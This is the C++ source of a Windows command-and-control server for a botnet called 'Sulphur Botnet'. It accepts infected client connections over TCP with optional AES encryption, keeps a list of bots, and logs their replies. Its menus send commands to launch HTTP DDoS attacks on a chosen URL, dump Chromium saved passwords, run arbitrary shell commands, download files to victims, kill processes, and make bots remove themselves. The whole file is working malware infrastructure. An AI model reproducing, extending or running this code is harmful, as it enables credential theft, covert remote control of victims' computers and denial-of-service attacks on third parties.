#define _SILENCE_ALL_CXX17_DEPRECATION_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable: 4018)
#pragma warning(disable: 4267)
#include <Base64.h>
#include <binaryhandling.hpp>
#include <chrono>
#include <Common.hpp>
#include <CONFIG.h>
#include <csignal>
/*#ifdef _DEBUG
#include <icecream.hpp>
#endif*/
#include <iostream>
#include <mutex>
#if ENCRYPT
#include <plusaes_wrapper.hpp>
#endif
#include <regex>
#include <stringsplit.hpp>
#include <thread>
#include <unordered_map>
#include <vector>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#if ENCRYPT && !defined(PASSWRD)
#error Define the password dumb!
#endif

std::unordered_map<std::string, unsigned int> cArr;
// SOCKET = unsigned int
SOCKET serverSocket = INVALID_SOCKET;
bool ctrlc = false, notis = true, send_auto = false, cctrlc = false;
#if ENCRYPT
nk125::plusaes_wrapper aes;
#endif
nk125::random r;
std::string autourl, automode;
int autothreads;

void help();
void choice();
void build_and_send(std::string, std::vector<std::string>, bool, std::string);

void glob_cleanup(int ret) {
    WSACleanup();
    std::exit(ret);
}

void clean(int sig) {
    ctrlc = true;
    std::cout << "Closing, thanks for using Sulphur!\n";
    glob_cleanup(0);
}

void kill_or_ret(int res, SOCKET sock) {
    if (res != SOCKET_ERROR) {
        return;
    }
    else {
        int err = WSAGetLastError();
        if (err == 10048) {
            std::cerr << "Winsock error: port in use, you can restart your network driver or change the bind port to fix this issue (" << err << ")\n";
        }
        else {
            std::cerr << "Socket error, WSAGLE: " << err << "\n";
        }

        closesocket(sock);
        WSACleanup();
        std::exit(0);
    }
}

void init_ws() {
    WSADATA wsaData;
    int iResult;
    struct sockaddr_in servAddr;

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        std::cerr << "WSA Startup Failure!\nError: " << iResult << "\n";
        return;
    }

    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (serverSocket == INVALID_SOCKET) {
        std::cerr << "Server socket init fail!\n";
        WSACleanup();
        return;
    }

    ZeroMemory(&servAddr, sizeof(servAddr));
    servAddr.sin_family = AF_INET;
    servAddr.sin_addr.s_addr = htonl(INADDR_ANY);
#ifdef DIFF_PORTS
    servAddr.sin_port = htons(SRV_PORT);
#else
    servAddr.sin_port = htons(CON_PORT);
#endif

    iResult = bind(serverSocket, (struct sockaddr*)&servAddr, sizeof(servAddr));
    kill_or_ret(iResult, serverSocket);

    iResult = listen(serverSocket, SOMAXCONN);
    kill_or_ret(iResult, serverSocket);
}

int send_str(SOCKET sock, std::string body) {
    long sendResult;
#if ENCRYPT
    std::string encb = aes.ecb_encrypt(body, PASSWRD);
#else 
    std::string encb = body;
#endif

#ifdef _DEBUG
    std::cerr << "Sending string: " << body << "\n";
#endif

    sendResult = send(sock, encb.c_str(), encb.size(), 0);

    if (sendResult == SOCKET_ERROR) {
#ifdef _DEBUG
        std::cout << "Error at send()\n";
#endif
        closesocket(sock);
    }

    return sendResult;
}

int recv_str(SOCKET sock, std::string& resp) {
    long iResult;
    std::vector<char> recvbuf;
    int recvbuflen = BUF_SZ;
    resp.clear();

    recvbuf.resize(recvbuflen);
    iResult = recv(sock, &recvbuf[0], recvbuflen, 0);

    if (iResult <= 0) {
#ifdef _DEBUG
        std::cerr << "Error at recv()\n";
#endif
        closesocket(sock);
        return iResult;
    }

    recvbuf.resize(iResult);

    resp.assign(recvbuf.begin(), recvbuf.end());

#ifdef _DEBUG
    std::cerr << "Received string: " << resp << "\n";
#endif

    return iResult;
}

bool stlstrcmp(std::string l, std::string r) {
    return l.find(r) != std::string::npos;
}

void send_all(std::string msg) {
    std::mutex m;
    long sendResult;

    for (auto s : cArr) {
        m.lock();
        sendResult = send_str(s.second, msg);

        if (sendResult == SOCKET_ERROR) {
            cArr.erase(cArr.find(s.first));
            if (notis) {
                std::cout << "Bot-" << s.first << " no longer works\n";
            }
            closesocket(s.second);
        }
        m.unlock();
    }

    return;
}

void ping(SOCKET cSock) {
    int sendResult, iResult;

#if ENCRYPT
    std::string buf, cbuf;
#else
    std::string buf;
#endif

    buf.assign(PTXT);

    sendResult = send_str(cSock, buf);

    if (sendResult == SOCKET_ERROR) {
        if (notis) {
            std::cout << "Connection forcefully closed :(\n";
        }
        closesocket(cSock);
        return;
    }

#if ENCRYPT
    do {
        iResult = recv_str(cSock, buf);

        cbuf += buf;

        if (iResult < BUF_SZ) {
            buf = aes.ecb_decrypt(cbuf, PASSWRD);
            cbuf.clear();
            break;
        }
        else {
            continue;
        }
    } while (iResult > 0);
#else
    iResult = recv_str(cSock, buf);
#endif

    if (iResult <= 0) {
        if (notis) {
            std::cout << "Connection reset by peer or undecryptable response!, buf: " << buf << "\n";
        }
        closesocket(cSock);
        return;
    }

    if (stlstrcmp(buf, PNOK)) {
        return;
    }
    else {
        if (notis) {
            std::cout << "Unrecognized return, maybe a fake client\nReturn String: " << buf << "\n";
        }
        shutdown(cSock, SD_SEND);
    }
}

std::string get_f(std::vector<std::string> sp, std::vector<std::string>& params) {
    std::string cmd;

    if (sp.size() > 0) {
        cmd = sp.at(0);
    }
    else {
        return "";
    }

    if (sp.size() > 1) {
        for (unsigned int i = 1; i < sp.size(); i++) {
            params.push_back(sp.at(i));
        }
    }

    return cmd;
}

void answer(SOCKET cSock) {
    std::mutex m;
    m.lock();
    std::string buf, id = r.gen_random(8);

#if ENCRYPT
    std::string cbuf;
#endif

    nk125::binary_file_handler b;
    long iResult;

    auto found = cArr.find(id);

    if (found == cArr.end()) {
        cArr.insert(std::pair<std::string, SOCKET>(id, cSock));

        if (notis) {
            std::cout << "Bot-" << id << " connected!\n";
        }

        ping(cSock);

        if (send_auto) {
            auto a = { autourl, automode };
            build_and_send("INIT", a, true, id);
            
            if (notis) {
                std::cout << "Bot-" << id << " received the DoS command succesfully\n";
            }
        }
    }
    m.unlock();

    do {
        m.lock();
        iResult = recv_str(cSock, buf);

        if (iResult <= 0) {
            auto found = cArr.find(id);

            if (found != cArr.end()) {
                if (notis) {
                    std::cout << "Bot-" << id << " Disconnected\n";
                }
                shutdown(found->second, SD_SEND);
                cArr.erase(found);
            }
            else {
                if (notis) {
                    std::cout << "Bot not recognized, trying to send PING text...\n";
                }

                ping(found->second);
            }
        }
        else {
#if ENCRYPT
            cbuf += buf;

            if (iResult < BUF_SZ) {
                buf = aes.ecb_decrypt(cbuf, PASSWRD);
                cbuf.clear();
#endif
                try {
                    buf = std::regex_replace(buf, std::regex("\n"), "\r\n");
                    b.append_file("Bot_" + id + "_recv.txt", buf);
                }
                catch (...) {
                    std::cout << "Can't write to Bot-" << id << " output file!\n";
                }

                if (notis) {
                    nk125::stringsplit s;
                    s.split(buf, DELM);
                    std::vector<std::string> params;

                    std::string ret = get_f(s.get_splitted_str(), params);

                    if (params.size() >= 2) {
                        std::cout << "Bot-" << id << ", response (" << params.at(0) << "): \n";

                        for (int i = 1; i < params.size(); i++) {
                            std::cout << params.at(i);
                        }

                        std::cout << "\n\n";
                    }
                }
#if ENCRYPT
            }
#endif
        }

        m.unlock();
    } while (iResult > 0);
}

void socklisten() {
    SOCKET clientSocket = INVALID_SOCKET;

    while (true) {
        clientSocket = accept(serverSocket, NULL, NULL);

        if (clientSocket == INVALID_SOCKET) {
            closesocket(serverSocket);
            WSACleanup();
            std::exit(0);
        }

        try {
            std::thread t(answer, clientSocket);
            t.detach();
        }
        catch (...) {}
    }
}

void print_clients() {
    std::cout << "Clients:\n";

    for (auto c : cArr) {
        std::cout << "  Bot-" << c.first << "\n";
    }

    std::cout << "Bots: " << cArr.size() << "\n";
}

void build_and_send(std::string cmd, std::vector<std::string> params, bool single = false, std::string id = "") {
    std::string tcp_cmd = cmd + DELM;

    if (stlstrcmp(tcp_cmd, "MASS_")) {
        send_all(tcp_cmd.substr(5));
        return;
    }

    if (!params.empty()) {
        for (std::string param : params) {
            tcp_cmd.append(macaron::Base64::Encode(param) + DELM);
        }
    }

    // Example: INIT, + http://google.com, + masspost,
    // INIT,http://google.com,masspost,
    // Perfectly Delimited! This should help to ignore garbage data in front of command

    if (!single) {
#ifdef _DEBUG
        std::cout << "Sending to all: " << tcp_cmd << " \n";
#endif

        send_all(tcp_cmd);
    }
    else {
        std::mutex m;

        m.lock();
        auto found = cArr.find(id);

        if (found != cArr.end()) {
#ifdef _DEBUG
            std::cout << "Sending " << tcp_cmd << " to: " << found->first << "\n";
#endif
            send_str(found->second, tcp_cmd);
        }
#ifdef _DEBUG
        else {
            std::cout << "ID: " << id << " not found\n";
        }
#endif
        m.unlock();
    }
}

void opt_f(std::string print, std::vector<std::string>& insert, std::string& buf) {
    std::cout << print;
    getline(std::cin, buf);
    std::cout << "\n";
    if (nk125::str_to_lower(buf) == "cancel") {
        throw NULL;
        return;
    }

    insert.push_back(buf);
    return;
}

void client_help() {
    std::cout << "\n\nClient options:\n"
        << "   1.- Help\n"
        << "   2.- Chromium Password Dumper\n"
        << "   3.- Get Client System Info\n"
        << "   4.- Suicide\n"
        << "   5.- Download\n"
        << "   6.- Kill Process\n"
        << "   7.- Exec\n"
        << "   8.- Restart\n"
        << "   9.- Exit Client Menu\n"
        << "\nType Cancel if you send wrong command!\n\n\n";
}

void client_choice(std::string& CID) {
    int opt;
    std::string sopt, buf, clientid = CID;

    std::cout << "Choice: ";

    if (getline(std::cin, sopt)) {
        std::cout << "\n";

        try {
            opt = stoi(sopt);
        }
        catch (...) {
            std::cout << "Bad input\n";
            return;
        }
    }
    else {
        std::cout << "Bad input\n";
        return;
    }

    std::vector<std::string> params;

    try {
        switch (opt) {
        case 1:
            break;
        case 2:
            // Password Stealer

            build_and_send("DUMP_PASS", params, true, clientid);
            break;
        case 3:
            // Sysinfo
            build_and_send("SYSTEM_INFO", params, true, clientid);
            break;
        case 4:
            // Suicide
            build_and_send("SUICIDE", params, true, clientid);
            break;
        case 5:
            // Download
            opt_f("Enter URL: ", params, buf);
            opt_f("Enter output filename: ", params, buf);

            std::cout << "Downloading...\n";

            build_and_send("DOWNLOAD", params, true, clientid);
            break;
        case 6:
            // Kill Process
            opt_f("Enter PID or Process Name: ", params, buf);

            std::cout << "Killing...\n";

            build_and_send("KILL", params, true, clientid);
            break;
        case 7:
            // Exec
            opt_f("Enter CMD: ", params, buf);

            std::cout << "Executing...\n";

            build_and_send("EXEC", params, true, clientid);
            break;
        case 8:
            // Restart
            std::cout << "Restarting...\n";

            build_and_send("RESTART", params, true, clientid);
            cctrlc = true;
            break;
        case 9:
            std::cout << "Closing menu...\n\n";
            cctrlc = true;
            help();
            break;
        }
    }
    catch (...) {
        return;
    }
}

void help() {
    std::cout << "Options:\n"
        << "   1.- Show this help\n"
        << "   2.- View clients connected\n"
        << "   3.- Init HTTP DDoS\n"
        << "   4.- Client Menu\n"
        << "   5.- Massive Suicide\n"
        << "   6.- Massive Restart\n"
        << "   7.- Stop DDoS\n"
        << "   8.- Exit\n"
        << "   9.- Toggle Notifications (Currently: " << (notis ? "on" : "off") << ")\n"
        << "\nType Cancel if you send wrong command!\n\n\n";
}

void choice() {
    int opt;
    std::string sopt, buf, cid;

    std::cout << "Choice: ";

    if (getline(std::cin, sopt)) {
        std::cout << "\n";

        try {
            opt = stoi(sopt);
        }
        catch (...) {
            std::cout << "Bad input\n";
            return;
        }
    } else {
        std::cout << "Bad input\n";
        return;
    }

    std::vector<std::string> params, none;

    try {
        switch (opt) {
        case 1:
            help();
            break;
        case 2:
            print_clients();
            break;
        case 3:
            // Init
            opt_f("Enter URL to DDoS: ", params, buf);
            autourl = buf;
            opt_f("Enter type of DDoS: ", params, buf);
            automode = buf;
            opt_f("Enter the threads you want to create in each client: ", params, buf);

            try {
                autothreads = stoi(buf);
            }
            catch (...) {
                std::cout << "Invalid argument\n";
                return;
            }

            opt_f("You want to send it to new clients automatically? (y|n): ", none, buf);
            
            if (!buf.empty()) {
                switch (buf[0]) {
                case 'y':
                    send_auto = true;
                    break;
                case 'n':
                    send_auto = false;
                    automode.clear();
                    autourl.clear();
                    autothreads = 0;
                    break;
                default:
                    std::cout << "Input not recognized\n";
                    return;
                }
            }
            else {
                std::cout << "Empty Input\n";
                break;
            }

            std::cout << "Sending instructions to all clients...\n";

            build_and_send("INIT", params);
            break;
        case 4:
            opt_f("Enter the Client ID to connect: ", none, buf);
            cid = buf;

            while (!cctrlc && !ctrlc) {
                auto found = cArr.find(buf);

                if (found != cArr.end()) {
                    client_help();
                    client_choice(cid);
                }
                else {
                    std::cout << "Client ID don't recognized or disconnected\n";
                    break;
                }
            }

            break;
        case 5:
            build_and_send("MASS_SUICIDE", params);
            break;
        case 6:
            build_and_send("MASS_RESTART", params);
            break;
        case 7:
            build_and_send("MASS_STOP", params);
            break;
        case 8:
            raise(SIGINT);
            std::exit(0);
            break;
        case 9:
            notis = !notis;
            std::cout << "Notifications " << (notis ? "activated" : "deactivated") << "\n";
            break;
        default:
            std::cout << "Unrecognized command\n";
            break;
        }
    }
    catch (...) {
        return; //  Catches anything thrown and restart Choice
    }

    return;
}

int main() {
    SetConsoleTitleA("Sulphur Server");
    signal(SIGINT, clean);
    init_ws();

    try {
        std::thread lth(socklisten);
        lth.detach();
    }
    catch (...) {}
    
    std::cout << "\rInitialising...";
    std::this_thread::sleep_for(std::chrono::milliseconds(400));
    std::cout.flush();

    std::cout << "\rAuthenticating...";
    std::this_thread::sleep_for(std::chrono::milliseconds(400));
    std::cout.flush();

    std::cout << "\r                     " << std::endl;

    std::cout << R""""(
                                                                                                            
                                                                                                    
                                                                                                    
                                                        '.                                          
             ,coxxxo:.                                 ;Xk.                                         
           ,kKxc;;;lxl.                                ;Xk.                                         
          :X0;         'c'      ,:.   'cccccc.      .,ckWXdc,.   .:,      'c.  ,,..:llc'            
         .kWc          :X0'    :Nk.  .kNxlo0Ml   .cdOxlxNKooO0o. .OX:    '0K, .kNOxoclkXx.          
         '0X:           oNx.  '0K,   ,KO.  oMl  .kWXc  ;Xk. .dNd. ;X0'  .dNc  .kWo.   .xWo          
         .OWc           .xNl .dXc    lNo   oMl  ;XMO.  ;Xk.  ,K0'  lNx. cXd.  .kX;     cWx.         
          lN0'           '0K;cXd.   '00'   oMl  ,KMK,  ;Xk.  cNk.  .xNl;0O'   .kNc     oWd          
          .lXKo:,',:dl.   :XXXO.  .:OK:    oMl   cOK0c'lNO;,o0O'    '0XXX:    .kWKo,.'oX0'          
            .cdxkkkdc.     oWX;   :ko'     ;k;     .cddOWXkdo;.      :NWo     .kNdlxxxdc.           
                          .xNl                         :XO.          lNk.     .kX;                  
                          :Kd.                         ,0x.         ,0O'      .xK,                  
                          ...                           ..          ...        ..                   
                                                                                                    
                                                                                                    

        )"""" << "\n\n\n\nSulphur Botnet - By NK125\n\n\n";

    help();

    while (!ctrlc) {
        choice();
    }
}